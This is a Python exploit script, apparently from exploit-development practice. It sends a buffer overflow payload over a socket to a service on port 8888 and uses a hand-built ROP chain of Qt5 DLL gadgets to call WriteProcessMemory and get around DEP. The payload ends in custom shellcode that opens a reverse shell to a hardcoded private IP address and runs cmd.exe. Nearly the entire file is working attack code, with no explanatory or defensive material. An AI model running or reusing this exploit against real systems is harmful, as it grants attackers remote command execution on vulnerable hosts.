from struct import pack
import socket

#\x00\x0A\x0D

TARGET_IP = "127.0.0.1"
TARGET_PORT = 8888
target = (TARGET_IP, TARGET_PORT)  

#690398A8 virtual protect (75e75c90)
#75e90cc0 WPM
#75e75c90 + 0001b030 = 75e90cc0

#68ff6d40 rw 
crash = 2300  # change me
offset = 1052

rop_nop = pack("<I",0x68ee5174) # RETN

#custom rev shell
shellcode = b"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x5d\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x3f\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x10\xc1\xca\x02\xc1\xca\x02\xc1\xca\x03\xc1\xca\x06\x01\xc2\xeb\xeb\x3b\x54\x24\x24\x75\xd6\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x10\x68\x8e\x4e\x0e\xec\xff\x55\x04\x89\x45\x14\x68\x72\xfe\xb3\x16\xff\x55\x04\x89\x45\x18\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\x55\x14\x89\xc3\x68\xcb\xed\xfc\x3b\xff\x55\x04\x89\x45\x1c\x68\xd9\x09\xf5\xad\xff\x55\x04\x89\x45\x20\x68\x0c\xba\x2d\xb3\xff\x55\x04\x89\x45\x24\x89\xe0\x66\xb9\x90\x05\x29\xc8\x50\x31\xc0\x66\xb8\x02\x02\x50\xff\x55\x1c\x31\xc0\x50\x50\x50\xb0\x06\x50\x2c\x05\x50\x40\x50\xff\x55\x20\x89\xc6\x31\xc0\x50\x50\x68\xc0\xa8\x72\x9a\x66\xb8\x01\xbb\xc1\xe0\x10\x66\x83\xc0\x02\x50\x54\x5f\x31\xc0\x50\x50\x50\x50\x04\x10\x50\x57\x56\xff\x55\x24\x56\x56\x56\x31\xc0\x50\x50\xb0\x80\x31\xc9\x66\xb9\x80\xff\x66\xf7\xd9\x01\xc8\x50\x31\xc0\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\xb0\x44\x50\x54\x5f\xb8\x9b\x87\x9a\xff\xf7\xd8\x50\x68\x63\x6d\x64\x2e\x54\x5b\x89\xe0\x31\xc9\x66\xb9\x90\x03\x29\xc8\x50\x57\x31\xc0\x50\x50\x50\x40\x50\x48\x50\x50\x53\x50\xff\x55\x18\x31\xc9\x51\x6a\xff\xff\x55\x10"
shellcode += b"\x90" * (500-len(shellcode))

#step 1 - saving esp to eax,edi
rop = pack("<I",0x68c7f391)  # PUSH ESP # POP EBX # POP ESI # RETN 
rop += pack('<L',0x41414141) # padding for pop ebp
rop += pack("<I",0x68bbd10f)  # MOV EAX,EBX # POP EBX # RETN 0x04  
rop += pack('<L',0x41414141) # padding for pop ebp
rop += rop_nop # padding for retn 0x04
rop += rop_nop # padding for retn 0x04
rop += pack("<I",0x68f37dbb)  # MOV EDI,EAX # RETN    ** [Qt5Core.dll] ** 

#step 2 - jumping over temaplte
rop += pack("<I",0x68b402ce)  # ADD ESP,1C # RETN    ** [Qt5Core.dll] **

# kernel32!WriteProcessMemory placeholder parameters
rop += pack('<L', 0x690398A8)    # Pointer to kernel32!WritePrivateProfileStringA (no pointers from IAT directly to kernel32!WriteProcessMemory, so loading pointer to kernel32.dll and compensating later.)
rop += pack('<L', 0x6d9edc01)    # RX from MODULE no aslr (Qt5Sql)
rop += pack('<L', 0xFFFFFFFF)    # hProccess = handle to current process (Pseudo handle = 0xFFFFFFFF points to current process)
rop += pack('<L', 0x6d9edc01)    # lpBaseAddress = RX from MODULE no aslr (Qt5Sql)
rop += pack('<L', 0x11111111)    # lpBuffer = base address of shellcode (dynamically generated)
rop += pack('<L', 0x22222222)    # nSize = size of shellcode 
rop += pack('<L', 0x68db0101)    # lpNumberOfBytesWritten = writable location RW in MODULE no aslr

# step 3 - patching address virtualprotect
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68be726b)  # xchg eax, ecx; ret;
rop += pack('<L', 0x6ab445f9)  # mov eax, ecx; ret;
rop += pack('<L', 0x6aa8d803)  # mov eax, dword ptr [eax]; ret;
rop += pack('<L', 0x6aa8d803)  # mov eax, dword ptr [eax]; ret;
rop += pack('<L', 0x68fd0343)  # POP EDX # RETN 
rop += pack('<L', 0xfffe4fd0)  # -0001b030
rop += pack('<L', 0x68bd5fe4)  # NEG EDX # RETN 0x0C    **
rop += rop_nop
rop += rop_nop
rop += rop_nop
rop += rop_nop 
rop += pack('<L', 0x68ce3817)  # ADD EAX,EDX # RETN    ** [Qt5Core.dll] **
rop += pack('<L', 0x68c7ffe6)  # mov dword ptr [ecx], eax; ret 4;
rop += rop_nop # padding for retn 0x04
rop += rop_nop # padding for retn 0x04


# patching lpBuffer 
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68fe0383) # INC ECX # RETN 
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68fe0383) # INC ECX # RETN 
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68fe0383) # INC ECX # RETN 
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68fe0383) # INC ECX # RETN 
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x6ab445f9)  # mov eax, ecx; ret;
rop += pack('<L', 0x68a8174b)  # XOR EDX,EDX # RETN  
rop += pack('<L', 0x68ae2632)  # POP EDX # RETN   
rop += pack('<L', 0xfffffd80) # -640
rop += pack('<L', 0x68bd5fe4)  # NEG EDX # RETN 0x0C 
rop += rop_nop
rop += rop_nop
rop += rop_nop
rop += rop_nop
rop += pack('<L', 0x68ad91ab)  # add eax, edx; ret;
rop += pack('<L', 0x68c7ffe6)  # mov dword ptr [ecx], eax; ret 4;
rop += rop_nop # padding for retn 0x04
rop += rop_nop # padding for retn 0x04

#patching size 0n512
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68fe0383) # INC ECX # RETN 
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x6ab445f9)  # mov eax, ecx; ret;
rop += pack('<L', 0x68a8174b)  # XOR EDX,EDX # RETN  
rop += pack('<L', 0x68ae2632)  # POP EDX # RETN   
rop += pack('<L', 0xfffffdff) # -513
rop += pack('<L', 0x68bd5fe4)  # NEG EDX # RETN 0x0C 
rop += rop_nop
rop += rop_nop
rop += rop_nop
rop += rop_nop
rop += pack('<L', 0x68b0ae38)  # mov dword ptr [ecx], edx; ret; 

#jumping to esp
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68aef5d0)  # XCHG EAX,ESP # RETN 

print((700 - len(rop)))
rop += b"\x90" * (700 - len(rop))

payload = b"A"*offset
payload += rop_nop
payload += rop
payload += shellcode
print(crash - len(payload))
payload += b"C"*(crash - len(payload))

with socket.create_connection(target) as sock:

    sent = sock.send(payload)
    print(f"sent {sent} bytes")
